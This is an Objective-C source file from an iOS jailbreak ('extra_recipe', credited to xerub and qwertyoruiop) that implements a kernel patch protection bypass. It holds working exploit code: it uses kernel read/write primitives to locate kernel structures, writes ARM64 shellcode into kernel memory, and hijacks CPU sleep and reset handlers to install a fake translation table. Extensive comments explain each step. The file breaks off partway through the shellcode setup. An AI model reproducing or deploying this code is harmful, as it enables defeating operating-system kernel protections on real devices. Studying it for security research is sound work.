//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//  Copyright © 2017 qwertyoruiop. All rights reserved.
//

#include "unjail.h"
#include "offsets.h"

// @qwertyoruiop's KPP bypass

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

struct mac_policy_ops{
    uint64_t mpo_audit_check_postselect;
    uint64_t mpo_audit_check_preselect;
    uint64_t mpo_bpfdesc_label_associate;
    uint64_t mpo_bpfdesc_label_destroy;
    uint64_t mpo_bpfdesc_label_init;
    uint64_t mpo_bpfdesc_check_receive;
    uint64_t mpo_cred_check_label_update_execve;
    uint64_t mpo_cred_check_label_update;
    uint64_t mpo_cred_check_visible;
    uint64_t mpo_cred_label_associate_fork;
    uint64_t mpo_cred_label_associate_kernel;
    uint64_t mpo_cred_label_associate;
    uint64_t mpo_cred_label_associate_user;
    uint64_t mpo_cred_label_destroy;
    uint64_t mpo_cred_label_externalize_audit;
    uint64_t mpo_cred_label_externalize;
    uint64_t mpo_cred_label_init;
    uint64_t mpo_cred_label_internalize;
    uint64_t mpo_cred_label_update_execve;
    uint64_t mpo_cred_label_update;
    uint64_t mpo_devfs_label_associate_device;
    uint64_t mpo_devfs_label_associate_directory;
    uint64_t mpo_devfs_label_copy;
    uint64_t mpo_devfs_label_destroy;
    uint64_t mpo_devfs_label_init;
    uint64_t mpo_devfs_label_update;
    uint64_t mpo_file_check_change_offset;
    uint64_t mpo_file_check_create;
    uint64_t mpo_file_check_dup;
    uint64_t mpo_file_check_fcntl;
    uint64_t mpo_file_check_get_offset;
    uint64_t mpo_file_check_get;
    uint64_t mpo_file_check_inherit;
    uint64_t mpo_file_check_ioctl;
    uint64_t mpo_file_check_lock;
    uint64_t mpo_file_check_mmap_downgrade;
    uint64_t mpo_file_check_mmap;
    uint64_t mpo_file_check_receive;
    uint64_t mpo_file_check_set;
    uint64_t mpo_file_label_init;
    uint64_t mpo_file_label_destroy;
    uint64_t mpo_file_label_associate;
    uint64_t mpo_ifnet_check_label_update;
    uint64_t mpo_ifnet_check_transmit;
    uint64_t mpo_ifnet_label_associate;
    uint64_t mpo_ifnet_label_copy;
    uint64_t mpo_ifnet_label_destroy;
    uint64_t mpo_ifnet_label_externalize;
    uint64_t mpo_ifnet_label_init;
    uint64_t mpo_ifnet_label_internalize;
    uint64_t mpo_ifnet_label_update;
    uint64_t mpo_ifnet_label_recycle;
    uint64_t mpo_inpcb_check_deliver;
    uint64_t mpo_inpcb_label_associate;
    uint64_t mpo_inpcb_label_destroy;
    uint64_t mpo_inpcb_label_init;
    uint64_t mpo_inpcb_label_recycle;
    uint64_t mpo_inpcb_label_update;
    uint64_t mpo_iokit_check_device;
    uint64_t mpo_ipq_label_associate;
    uint64_t mpo_ipq_label_compare;
    uint64_t mpo_ipq_label_destroy;
    uint64_t mpo_ipq_label_init;
    uint64_t mpo_ipq_label_update;
    uint64_t mpo_file_check_library_validation;
    uint64_t mpo_vnode_notify_setacl;
    uint64_t mpo_vnode_notify_setattrlist;
    uint64_t mpo_vnode_notify_setextattr;
    uint64_t mpo_vnode_notify_setflags;
    uint64_t mpo_vnode_notify_setmode;
    uint64_t mpo_vnode_notify_setowner;
    uint64_t mpo_vnode_notify_setutimes;
    uint64_t mpo_vnode_notify_truncate;
    uint64_t mpo_mbuf_label_associate_bpfdesc;
    uint64_t mpo_mbuf_label_associate_ifnet;
    uint64_t mpo_mbuf_label_associate_inpcb;
    uint64_t mpo_mbuf_label_associate_ipq;
    uint64_t mpo_mbuf_label_associate_linklayer;
    uint64_t mpo_mbuf_label_associate_multicast_encap;
    uint64_t mpo_mbuf_label_associate_netlayer;
    uint64_t mpo_mbuf_label_associate_socket;
    uint64_t mpo_mbuf_label_copy;
    uint64_t mpo_mbuf_label_destroy;
    uint64_t mpo_mbuf_label_init;
    uint64_t mpo_mount_check_fsctl;
    uint64_t mpo_mount_check_getattr;
    uint64_t mpo_mount_check_label_update;
    uint64_t mpo_mount_check_mount;
    uint64_t mpo_mount_check_remount;
    uint64_t mpo_mount_check_setattr;
    uint64_t mpo_mount_check_stat;
    uint64_t mpo_mount_check_umount;
    uint64_t mpo_mount_label_associate;
    uint64_t mpo_mount_label_destroy;
    uint64_t mpo_mount_label_externalize;
    uint64_t mpo_mount_label_init;
    uint64_t mpo_mount_label_internalize;
    uint64_t mpo_netinet_fragment;
    uint64_t mpo_netinet_icmp_reply;
    uint64_t mpo_netinet_tcp_reply;
    uint64_t mpo_pipe_check_ioctl;
    uint64_t mpo_pipe_check_kqfilter;
    uint64_t mpo_pipe_check_label_update;
    uint64_t mpo_pipe_check_read;
    uint64_t mpo_pipe_check_select;
    uint64_t mpo_pipe_check_stat;
    uint64_t mpo_pipe_check_write;
    uint64_t mpo_pipe_label_associate;
    uint64_t mpo_pipe_label_copy;
    uint64_t mpo_pipe_label_destroy;
    uint64_t mpo_pipe_label_externalize;
    uint64_t mpo_pipe_label_init;
    uint64_t mpo_pipe_label_internalize;
    uint64_t mpo_pipe_label_update;
    uint64_t mpo_policy_destroy;
    uint64_t mpo_policy_init;
    uint64_t mpo_policy_initbsd;
    uint64_t mpo_policy_syscall;
    uint64_t mpo_system_check_sysctlbyname;
    uint64_t mpo_proc_check_inherit_ipc_ports;
    uint64_t mpo_vnode_check_rename;
    uint64_t mpo_kext_check_query;
    uint64_t mpo_iokit_check_nvram_get;
    uint64_t mpo_iokit_check_nvram_set;
    uint64_t mpo_iokit_check_nvram_delete;
    uint64_t mpo_proc_check_expose_task;
    uint64_t mpo_proc_check_set_host_special_port;
    uint64_t mpo_proc_check_set_host_exception_port;
    uint64_t mpo_exc_action_check_exception_send;
    uint64_t mpo_exc_action_label_associate;
    uint64_t mpo_exc_action_label_copy;
    uint64_t mpo_exc_action_label_destroy;
    uint64_t mpo_exc_action_label_init;
    uint64_t mpo_exc_action_label_update;
    uint64_t mpo_reserved1;
    uint64_t mpo_reserved2;
    uint64_t mpo_reserved3;
    uint64_t mpo_reserved4;
    uint64_t mpo_reserved5;
    uint64_t mpo_reserved6;
    uint64_t mpo_posixsem_check_create;
    uint64_t mpo_posixsem_check_open;
    uint64_t mpo_posixsem_check_post;
    uint64_t mpo_posixsem_check_unlink;
    uint64_t mpo_posixsem_check_wait;
    uint64_t mpo_posixsem_label_associate;
    uint64_t mpo_posixsem_label_destroy;
    uint64_t mpo_posixsem_label_init;
    uint64_t mpo_posixshm_check_create;
    uint64_t mpo_posixshm_check_mmap;
    uint64_t mpo_posixshm_check_open;
    uint64_t mpo_posixshm_check_stat;
    uint64_t mpo_posixshm_check_truncate;
    uint64_t mpo_posixshm_check_unlink;
    uint64_t mpo_posixshm_label_associate;
    uint64_t mpo_posixshm_label_destroy;
    uint64_t mpo_posixshm_label_init;
    uint64_t mpo_proc_check_debug;
    uint64_t mpo_proc_check_fork;
    uint64_t mpo_proc_check_get_task_name;
    uint64_t mpo_proc_check_get_task;
    uint64_t mpo_proc_check_getaudit;
    uint64_t mpo_proc_check_getauid;
    uint64_t mpo_proc_check_getlcid;
    uint64_t mpo_proc_check_mprotect;
    uint64_t mpo_proc_check_sched;
    uint64_t mpo_proc_check_setaudit;
    uint64_t mpo_proc_check_setauid;
    uint64_t mpo_proc_check_setlcid;
    uint64_t mpo_proc_check_signal;
    uint64_t mpo_proc_check_wait;
    uint64_t mpo_proc_label_destroy;
    uint64_t mpo_proc_label_init;
    uint64_t mpo_socket_check_accept;
    uint64_t mpo_socket_check_accepted;
    uint64_t mpo_socket_check_bind;
    uint64_t mpo_socket_check_connect;
    uint64_t mpo_socket_check_create;
    uint64_t mpo_socket_check_deliver;
    uint64_t mpo_socket_check_kqfilter;
    uint64_t mpo_socket_check_label_update;
    uint64_t mpo_socket_check_listen;
    uint64_t mpo_socket_check_receive;
    uint64_t mpo_socket_check_received;
    uint64_t mpo_socket_check_select;
    uint64_t mpo_socket_check_send;
    uint64_t mpo_socket_check_stat;
    uint64_t mpo_socket_check_setsockopt;
    uint64_t mpo_socket_check_getsockopt;
    uint64_t mpo_socket_label_associate_accept;
    uint64_t mpo_socket_label_associate;
    uint64_t mpo_socket_label_copy;
    uint64_t mpo_socket_label_destroy;
    uint64_t mpo_socket_label_externalize;
    uint64_t mpo_socket_label_init;
    uint64_t mpo_socket_label_internalize;
    uint64_t mpo_socket_label_update;
    uint64_t mpo_socketpeer_label_associate_mbuf;
    uint64_t mpo_socketpeer_label_associate_socket;
    uint64_t mpo_socketpeer_label_destroy;
    uint64_t mpo_socketpeer_label_externalize;
    uint64_t mpo_socketpeer_label_init;
    uint64_t mpo_system_check_acct;
    uint64_t mpo_system_check_audit;
    uint64_t mpo_system_check_auditctl;
    uint64_t mpo_system_check_auditon;
    uint64_t mpo_system_check_host_priv;
    uint64_t mpo_system_check_nfsd;
    uint64_t mpo_system_check_reboot;
    uint64_t mpo_system_check_settime;
    uint64_t mpo_system_check_swapoff;
    uint64_t mpo_system_check_swapon;
    uint64_t mpo_reserved7;
    uint64_t mpo_sysvmsg_label_associate;
    uint64_t mpo_sysvmsg_label_destroy;
    uint64_t mpo_sysvmsg_label_init;
    uint64_t mpo_sysvmsg_label_recycle;
    uint64_t mpo_sysvmsq_check_enqueue;
    uint64_t mpo_sysvmsq_check_msgrcv;
    uint64_t mpo_sysvmsq_check_msgrmid;
    uint64_t mpo_sysvmsq_check_msqctl;
    uint64_t mpo_sysvmsq_check_msqget;
    uint64_t mpo_sysvmsq_check_msqrcv;
    uint64_t mpo_sysvmsq_check_msqsnd;
    uint64_t mpo_sysvmsq_label_associate;
    uint64_t mpo_sysvmsq_label_destroy;
    uint64_t mpo_sysvmsq_label_init;
    uint64_t mpo_sysvmsq_label_recycle;
    uint64_t mpo_sysvsem_check_semctl;
    uint64_t mpo_sysvsem_check_semget;
    uint64_t mpo_sysvsem_check_semop;
    uint64_t mpo_sysvsem_label_associate;
    uint64_t mpo_sysvsem_label_destroy;
    uint64_t mpo_sysvsem_label_init;
    uint64_t mpo_sysvsem_label_recycle;
    uint64_t mpo_sysvshm_check_shmat;
    uint64_t mpo_sysvshm_check_shmctl;
    uint64_t mpo_sysvshm_check_shmdt;
    uint64_t mpo_sysvshm_check_shmget;
    uint64_t mpo_sysvshm_label_associate;
    uint64_t mpo_sysvshm_label_destroy;
    uint64_t mpo_sysvshm_label_init;
    uint64_t mpo_sysvshm_label_recycle;
    uint64_t mpo_reserved8;
    uint64_t mpo_reserved9;
    uint64_t mpo_vnode_check_getattr;
    uint64_t mpo_mount_check_snapshot_create;
    uint64_t mpo_mount_check_snapshot_delete;
    uint64_t mpo_vnode_check_clone;
    uint64_t mpo_proc_check_get_cs_info;
    uint64_t mpo_proc_check_set_cs_info;
    uint64_t mpo_iokit_check_hid_control;
    uint64_t mpo_vnode_check_access;
    uint64_t mpo_vnode_check_chdir;
    uint64_t mpo_vnode_check_chroot;
    uint64_t mpo_vnode_check_create;
    uint64_t mpo_vnode_check_deleteextattr;
    uint64_t mpo_vnode_check_exchangedata;
    uint64_t mpo_vnode_check_exec;
    uint64_t mpo_vnode_check_getattrlist;
    uint64_t mpo_vnode_check_getextattr;
    uint64_t mpo_vnode_check_ioctl;
    uint64_t mpo_vnode_check_kqfilter;
    uint64_t mpo_vnode_check_label_update;
    uint64_t mpo_vnode_check_link;
    uint64_t mpo_vnode_check_listextattr;
    uint64_t mpo_vnode_check_lookup;
    uint64_t mpo_vnode_check_open;
    uint64_t mpo_vnode_check_read;
    uint64_t mpo_vnode_check_readdir;
    uint64_t mpo_vnode_check_readlink;
    uint64_t mpo_vnode_check_rename_from;
    uint64_t mpo_vnode_check_rename_to;
    uint64_t mpo_vnode_check_revoke;
    uint64_t mpo_vnode_check_select;
    uint64_t mpo_vnode_check_setattrlist;
    uint64_t mpo_vnode_check_setextattr;
    uint64_t mpo_vnode_check_setflags;
    uint64_t mpo_vnode_check_setmode;
    uint64_t mpo_vnode_check_setowner;
    uint64_t mpo_vnode_check_setutimes;
    uint64_t mpo_vnode_check_stat;
    uint64_t mpo_vnode_check_truncate;
    uint64_t mpo_vnode_check_unlink;
    uint64_t mpo_vnode_check_write;
    uint64_t mpo_vnode_label_associate_devfs;
    uint64_t mpo_vnode_label_associate_extattr;
    uint64_t mpo_vnode_label_associate_file;
    uint64_t mpo_vnode_label_associate_pipe;
    uint64_t mpo_vnode_label_associate_posixsem;
    uint64_t mpo_vnode_label_associate_posixshm;
    uint64_t mpo_vnode_label_associate_singlelabel;
    uint64_t mpo_vnode_label_associate_socket;
    uint64_t mpo_vnode_label_copy;
    uint64_t mpo_vnode_label_destroy;
    uint64_t mpo_vnode_label_externalize_audit;
    uint64_t mpo_vnode_label_externalize;
    uint64_t mpo_vnode_label_init;
    uint64_t mpo_vnode_label_internalize;
    uint64_t mpo_vnode_label_recycle;
    uint64_t mpo_vnode_label_store;
    uint64_t mpo_vnode_label_update_extattr;
    uint64_t mpo_vnode_label_update;
    uint64_t mpo_vnode_notify_create;
    uint64_t mpo_vnode_check_signature;
    uint64_t mpo_vnode_check_uipc_bind;
    uint64_t mpo_vnode_check_uipc_connect;
    uint64_t mpo_proc_check_run_cs_invalid;
    uint64_t mpo_proc_check_suspend_resume;
    uint64_t mpo_thread_userret;
    uint64_t mpo_iokit_check_set_properties;
    uint64_t mpo_system_check_chud;
    uint64_t mpo_vnode_check_searchfs;
    uint64_t mpo_priv_check;
    uint64_t mpo_priv_grant;
    uint64_t mpo_proc_check_map_anon;
    uint64_t mpo_vnode_check_fsgetpath;
    uint64_t mpo_iokit_check_open;
    uint64_t mpo_proc_check_ledger;
    uint64_t mpo_vnode_notify_rename;
    uint64_t mpo_vnode_check_setacl;
    uint64_t mpo_vnode_notify_deleteextattr;
    uint64_t mpo_system_check_kas_info;
    uint64_t mpo_proc_check_cpumon;
    uint64_t mpo_vnode_notify_open;
    uint64_t mpo_system_check_info;
    uint64_t mpo_pty_notify_grant;
    uint64_t mpo_pty_notify_close;
    uint64_t mpo_vnode_find_sigs;
    uint64_t mpo_kext_check_load;
    uint64_t mpo_kext_check_unload;
    uint64_t mpo_proc_check_proc_info;
    uint64_t mpo_vnode_notify_link;
    uint64_t mpo_iokit_check_filter_properties;
    uint64_t mpo_iokit_check_get_property;
};

#define ReadAnywhere32 kread_uint32
#define WriteAnywhere32 kwrite_uint32
#define ReadAnywhere64 kread_uint64
#define WriteAnywhere64 kwrite_uint64

#define copyin(to, from, size) kread(from, to, size)
#define copyout(to, from, size) kwrite(to, from, size)

#import "pte_stuff.h"

#include "patchfinder64.h"

static void
kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
{
    // check page size
    checkvad();
    
    uint64_t entryp;
    
    // Calculate various kernel code base addresses & sizes
    int rv = init_kernel(kernbase, NULL);
    assert(rv == 0);
    
    // Find the "gPhysBase" global variable
    uint64_t gStoreBase = find_gPhysBase();
    
    // It's kind of strange but contrary to the definition of these variables within the source code, "gVirtBase" is located *after* "gPhysBase" according to the disassembly
    // SECURITY_READ_ONLY_LATE(unsigned long) gVirtBase;
    // SECURITY_READ_ONLY_LATE(unsigned long) gPhysBase;
    gPhysBase = ReadAnywhere64(gStoreBase);
    gVirtBase = ReadAnywhere64(gStoreBase+8);
    
    // Kernel entrypoint. We found it earlier in "init_kernel(kernbase, NULL);"
    entryp = find_entry() + slide;
    // The reason why it's doing this can be explained from the kernel entrypoint _start, as shown in asfmk/arm64/start.s
    /*
     * __start trampoline is located at a position relative to LowResetVectorBase
     * so that iBoot can compute the reset vector position to set IORVBAR using
     * only the kernel entry point.  Reset vector = (__start & ~0xfff)
     */
    // It's actually calculating the LowResetVectorBase function address
    uint64_t rvbar = entryp & (~0xFFF);
    
    // If you look at asfmk/arm64/start.s, then you can see that it's trying to retrieve the address of CPU_DATA_ENTRIES, which is an array of "cpu_data_entry" structures as defined in "cpu_data_internal.h"
    //
    // typedef struct cpu_data_entry {
    //     void                    *cpu_data_paddr;             /* Cpu data physical address */
    //     struct  cpu_data        *cpu_data_vaddr;             /* Cpu data virtual address */
    // #if __arm__
    //     uint32_t                cpu_data_offset_8;
    //     uint32_t                cpu_data_offset_12;
    // #elif __arm64__
    // #else
    // #error Check cpu_data_entry padding for this architecture
    // #endif
    // } cpu_data_entry_t;
    // 
    // Those cpu_data_paddr/vaddr pointers actually point to huge "cpu_data" structures as defined in the same file
    // 
    // typedef struct cpu_data
    // {
    //     unsigned short              cpu_number;
    //     unsigned short              cpu_flags;
    //     vm_offset_t             istackptr;
    //     vm_offset_t             intstack_top;
    //     vm_offset_t             fiqstackptr;
    // ...
    // ...
    // ...
    uint64_t cpul = find_register_value(rvbar+0x40, 1);
    
    // Similarly, it's retrieving the value from "const_boot_args" which contains the boot arguments
    //
    // typedef struct boot_args {
    //     uint16_t        Revision;           /* Revision of boot_args structure */
    //     uint16_t        Version;            /* Version of boot_args structure */
    //     uint32_t        virtBase;           /* Virtual base of memory */
    //     uint32_t        physBase;           /* Physical base of memory */
    //     uint32_t        memSize;            /* Size of memory */
    //     uint32_t        topOfKernelData;    /* Highest physical address used in kernel data area */
    //     Boot_Video      Video;              /* Video Information */
    //     uint32_t        machineType;        /* Machine Type */
    //     void            *deviceTreeP;       /* Base of flattened device tree */
    //     uint32_t        deviceTreeLength;   /* Length of flattened tree */
    //     char            CommandLine[BOOT_LINE_LENGTH];  /* Passed in command line */
    //     uint32_t        bootFlags;      /* Additional flags specified by the bootloader */
    //     uint32_t        memSizeActual;      /* Actual size of memory */
    // } boot_args;
    uint64_t optr = find_register_value(rvbar+0x50, 20);
    // Convert it to a physical -> virtual address in case it's stored in paddress form
    if (uref) {
        optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
    }
    NSLog(@"%llx", optr);
    
    // rvbar+0x40 calculates cpul all the way up to and slightly after :
    //
    // Lnext_cpu_data_entry:
    // add     x1, x1, #16                 // Increment to the next cpu data entry
    //
    // So we need to account for that and subtract 0x10
    // Then convert the paddress(Physical) to a vaddress(Virtual)
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    // Dereference it to get CPU_DATA_PADDR, the start of the array of "cpu_data_entry" structures
    uint64_t cpu = ReadAnywhere64(cpu_list);
    
    // Gets the "kernel_pmap" global variable, which stores the physical mapping information of the kernel
    uint64_t pmap_store = find_kernel_pmap();
    NSLog(@"pmap: %llx", pmap_store);
    // This is what a pmap structure looks like :
    //
    // struct pmap {
    //     tt_entry_t          *tte;           /* translation table entries */
    //     pmap_paddr_t        ttep;           /* translation table physical */
    //     vm_map_address_t    min;            /* min address in pmap */
    //     vm_map_address_t    max;            /* max address in pmap */
    //     unsigned int        asid;           /* address space id */
    //     unsigned int        vasid;          /* Virtual address space id */
    // ...
    // ...
    // ...
    // It's trying to get "kernel_pmap->tte", which points to the L1(Level 1) Translation Table
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
    
    
    
    // Allocate space to store shellcode
    // The buffer is big enough so the start address aligns to the beginning of the physical page of where it's allocated
    uint64_t shellcode = physalloc(0x4000);
    
    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */
    
    /*
        ldr x30, 0x00000010
        ldr x0, 0x00000018
        br  x0
        0x10:
        ???
        0x18:
        [resume_idle_cpu]   <- will be stored later in the while loop
    */
    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    /*
        ldr x30, 0x00000010
        ldr x0, 0x00000018
        br  x0
        0x10:
        ???
        0x18:
        [start_cpu]   <- will be stored later in the while loop
    */
    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    // Copying bootargs inside the shellcode buffer. It's copying in and out cause there's no helper function to directly copy stuff around within the kernel.
    // It doesn't really seem to use the bootargs anywhere though.
    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);
    
    // Get the physical address of the shellcode
    uint64_t physcode = findphys_real(shellcode);
    
    
    
    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
    
    uint64_t idlesleep_handler = 0;
    
    // This is going to hold the address of "cpu_data->cpu_reset_handler" of every CPU.
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;
    
    int idx = 0;
    int ridx = 0;
    // This loop will fill the above "plist" with some kind of address. Let's see what it's filling it up with.
    while (cpu) {
        // "cpu_data_paddr" is stored in PA form. Converting it to VA
        cpu = cpu - gPhysBase + gVirtBase;
        // This means that "cpu_data->cpu_reset_handler" was already overwritten by another value(It's assuming that it's probably not 0x.....100). Assume that it's jailbroken and return immediately.
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            NSLog(@"already jailbroken, bailing out");
            return;
        }
        
        
        if (!idlesleep_handler) {
            // cpu_data->cpu_reset_handler
            // Currently points to the address of the "resume_idle_cpu" function (Called when the CPU is idle) because the CPU is obviously not in deep sleep when an exploit is running...
            // From start.s : LEXT(resume_idle_cpu) ...........
            // Why the heck is it trying to jump to "resume_idle_cpu"? This is absolutely confusing. This is because "resume_idle_cpu" will immediately restore X30 into a hardcoded value, which makes
            // the X30 patch in "shellcode" useless. Just ignore this piece of code for now, it becomes clearer later because this value becomes replaced by another one,
            // which makes it even more clear that this code is basically doing nothing.
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            // Address of the "start_cpu" function (Called when the CPU goes to deep sleep : 30 seconds)
            // From start.s : LEXT(start_cpu) ...........
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
            
            // Convert the address from PA -> VA
            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
            
            
            uint32_t* opcz = malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            // It's trying to find "arm_init_tramp"
            // After the loop, 'idx' points right before "arm_init_tramp"
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            // There should be a RET a little bit after it
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
            
            
        }
        
        // cpu_data->cpu_phys_id
        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
        // cpu_data->cpu_reset_handler => resume_idle_cpu
        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
        
        // It's storing the address of each "cpu_data->cpu_reset_handler" into an array
        plist[z++] = cpu+0x130;
        // Traverse the entire cpu_data array
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }
    
    // Space for shellcode
    uint64_t shc = physalloc(0x4000);
    
    // Finding the address of "arm_init_idle_cpu"
    uint64_t regi = find_register_value(idlesleep_handler+12, 30);
    // Finding the address of "arm_init_cpu"
    uint64_t regd = find_register_value(idlesleep_handler+24, 30);
    
    NSLog(@"%llx - %llx", regi, regd);
    
    // Initialize the shellcode with NOP
    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);   // NOP
    }
    
    /*
     isvad 0 == 0x4000
     */
    
    // Space for the fake L1 Tranlation Table
    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
    
    // So why did the above code try to find "arm_init_tramp"? Because the function retrieves the value from the global var "cpu_ttep", the L1 translation table for TTBR1_EL1
    // It's being set in arm_vm_init.c in this line => set_mmu_ttb_alternate(cpu_ttep & TTBR_BADDR_MASK);
    // There's also TTBR0_EL1, but it's the "invalid translation table" so it's pretty much no use to us(It's zeroed out entirely). Probably that's why it doesn't bother restoring it later on in the shellcode.
    uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
    
    // "cpu_ttep" is a pointer of a pointer. Get that pointer
    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
    
    // Temporary space to use for various Translation Table related things
    char* bbuf = malloc(0x4000);
    // Copy the entire Table out temporarily
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    // Copy it back into the kernel. We have to keep everything the kernel uses(including all shellcode etc) in the kernel cause if you keep it in userspace, the kernel won't be able to see it if
    // a different process takes over the CPU and the Virtual Address Space changes to use a different translation table
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
    
    // Get the physical address of the fake L1 Translation Table
    uint64_t physp = findphys_real(level0_pte);
    
    // At this point we haven't really touched anything in the kernel and it's still in a pristine state. Still doing the setup stuff
    // Skip this part for now and revisit here when I understand why and when this is actually invoked.
    // ...
    // ...
    // ...
    // Came back here from analyzing the place where this was called(it gets called after the "RET" in "arm_init_tramp", because the mini trampoline above set X30(LR) to jump here).
    // In order to understand what this piece of code is trying to do, we first need to understand what "arm_init_tramp" was trying to do. A snippet of the function with variables renamed for clarity.
    /*
        __TEXT_EXEC:__text:FFFFFFF007087264             arm_init_tramp                          ; DATA XREF: sub_FFFFFFF007087178:loc_FFFFFFF007087250↑o
        __TEXT_EXEC:__text:FFFFFFF007087264                                                     ; sub_FFFFFFF007087178+DC↑o
        __TEXT_EXEC:__text:FFFFFFF007087264 E0 FE FF D0                 ADRP            X0, #invalid_ttep@PAGE
        __TEXT_EXEC:__text:FFFFFFF007087268 00 20 16 91                 ADD             X0, X0, #invalid_ttep@PAGEOFF
        __TEXT_EXEC:__text:FFFFFFF00708726C 00 00 40 F9                 LDR             X0, [X0]
        __TEXT_EXEC:__text:FFFFFFF007087270 E1 FE FF D0                 ADRP            X1, #cpu_tte@PAGE
        __TEXT_EXEC:__text:FFFFFFF007087274 21 40 16 91                 ADD             X1, X1, #cpu_tte@PAGEOFF
        __TEXT_EXEC:__text:FFFFFFF007087278 21 00 40 F9                 LDR             X1, [X1]
        __TEXT_EXEC:__text:FFFFFFF00708727C 00 20 18 D5                 MSR             TTBR0_EL1, X0
        __TEXT_EXEC:__text:FFFFFFF007087280 21 20 18 D5                 MSR             TTBR1_EL1, X1
        __TEXT_EXEC:__text:FFFFFFF007087284 A0 02 16 8B                 ADD             X0, X21, X22
        __TEXT_EXEC:__text:FFFFFFF007087288 00 00 17 CB                 SUB             X0, X0, X23
        __TEXT_EXEC:__text:FFFFFFF00708728C 01 00 80 D2                 MOV             X1, #0
        __TEXT_EXEC:__text:FFFFFFF007087290 DF 3F 03 D5                 ISB
        __TEXT_EXEC:__text:FFFFFFF007087294 1F 87 08 D5                 TLBI            VMALLE1
        __TEXT_EXEC:__text:FFFFFFF007087298 9F 3F 03 D5                 DSB             SY
        __TEXT_EXEC:__text:FFFFFFF00708729C DF 3F 03 D5                 ISB
        __TEXT_EXEC:__text:FFFFFFF0070872A0 C0 03 5F D6                 RET
    */
    // Aha! Now we understand why a 'fixup code' needs to be injected. 'TTBR1_EL1' is being restored to the original L1 Page Table from a global variable 'cpu_tte'!
    // If we don't restore TTBR1_EL1, then when the device wakes up, "arm_init_tramp" will overwrite our fake L1 Page Table stored inside TTBR1_EL1 with the original pristine L1 Page Table.
    // So what the following code is trying to do is to let "arm_init_tramp" do it's job, and after the "RET", it's overwriting TTBR1_EL1 *again* with the fake L1 Page Table.
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    // Reload TTBR1_EL1 with the fake L1 Page Table. 
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    // Flush the TLB again with the fake L1 Page Table, cause "arm_init_tramp" flushed it a few moments ago with the real L1 Page Table.
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    // What was 'regi' again? Looking above, 'regi' stores the address of 'arm_init_idle_cpu', the original function where the "RET" was trying to jump to. Therefore, we can deduce that the mini trampoline
    // setup above and this piece of code acts as a simplistic hook to intercept the "RET" right when it's about to jump to "arm_init_idle_cpu".
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    
    // Doin' the same thing for the deep sleep handler
    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
